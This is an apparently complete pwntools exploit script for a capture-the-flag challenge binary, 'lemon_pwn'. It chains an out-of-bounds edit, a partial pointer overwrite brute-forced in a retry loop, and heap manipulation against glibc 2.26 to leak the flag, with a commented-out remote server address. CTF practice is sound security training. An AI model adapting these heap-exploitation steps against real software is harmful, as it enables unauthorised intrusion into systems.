from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('lemon_pwn')
# io = remote('47.104.70.90', 25315)
libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc-2.26.so')
# libc = ELF('libc-2.26.so')
elf = ELF('lemon_pwn')


def add(index, name, size, message = ''):
    io.sendlineafter('your choice >>> ', '1')
    io.sendlineafter('Input the index of your lemon: ', str(index))
    io.sendafter('Now, name your lemon: ', name)
    io.sendlineafter('Input the length of message for you lemon: ', str(size))
    if size <= 0x400:
        io.sendafter('Leave your message: ', message)


def show(index):
    io.sendlineafter('your choice >>> ', '2')
    io.sendlineafter('Input the index of your lemon : ', str(index))
    io.recvuntil('eat eat eat ')
    return int(io.recvuntil('...\n', drop=True), 16)


def delete(index):
    io.sendlineafter('your choice >>> ', '3')
    io.sendlineafter('Input the index of your lemon : ', str(index))


def edit(index, payload):
    io.sendlineafter('your choice >>> ', '4')
    io.sendlineafter('Input the index of your lemon  : ', str(index))
    io.sendafter('Now it\'s your time to draw and color!', payload)


def pwn():
    io.sendlineafter("Do you wanner play a guess-lemon-color game with me?\n", "yes")
    io.sendafter("Give me your lucky number: \n", "111111")

    payload = b'1' * 0x10 + p32(0x300) + b'\x01'
    io.sendafter("tell me you name first: \n", payload)
    io.recvuntil(', your reward is ')
    low = int(io.recvline()[:-1], 16)

    edit(-260, b'1' * 0x138 + p16(low + 0xe000 - 0x40))   # 1/16
    add(0, 'A', 0x500)
    delete(0)
    add(1, '\x10', 0x10, 'a')
    add(0, '\x10', 0x10, 'a')
    io.sendlineafter('your choice >>> ', '1')
    io.sendlineafter('Input the index of your lemon: ', '0')
    result = io.recvuntil('}').decode()
    log.success(result)
    # gdb.attach(io)
    # pause()



if __name__ == '__main__':
    while True:
        try:
            pwn()
        except EOFError:
            io.close()
            io = process('lemon_pwn')
        else:
            break
